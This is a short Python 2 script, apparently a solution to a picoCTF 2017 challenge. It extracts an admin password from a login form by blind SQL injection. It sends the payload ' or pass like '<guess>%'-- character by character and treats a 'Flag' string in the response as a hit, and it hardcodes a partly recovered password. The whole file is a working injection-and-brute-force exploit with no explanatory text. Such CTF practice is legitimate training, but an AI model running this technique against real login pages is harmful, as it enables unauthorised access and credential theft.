#!/usr/bin/python

import urllib, urllib2

def char_range(c1, c2):
    """Generates the characters from `c1` to `c2`, inclusive."""
    for c in xrange(ord(c1), ord(c2)+1):
        yield chr(c)

def majuscule():
    for c in xrange(ord('A'), ord('Z')+1):
        yield chr(c)

def makeRequest(password):
    params = {'username':'admin','password':'\' or pass like \''+password+'%\'--'}
    req = urllib2.Request("http://shell2017.picoctf.com:40788/", urllib.urlencode(params))
    result = urllib2.urlopen(req)
    data = result.read()
    if "Flag" in data:
        return True
    return False

def findNext(password):
    for car in majuscule():
        if car not in "%":
            #print "Testing "+password+car
            if makeRequest(password+car):
                #print "Found "+password+car
                return password+car;
    for car in char_range(' ','~'):
        if car not in "%_":
            #print "Testing "+password+car
            if makeRequest(password+car):
                #print "Found "+password+car
                return password+car;

def main():
    password="NOT_ALL_ERRORS_SHOULD_BE_SHOWN_FAA8380E951439EEBB3D452B5E86F3F"
    #password="NOT"
    print len(password)
    for x in range(len(password), 63):
        password = findNext(password)
        print "Found "+password+" "+str(len(password))+"/63"
    print "Found : "+password


if __name__ == "__main__":
    main()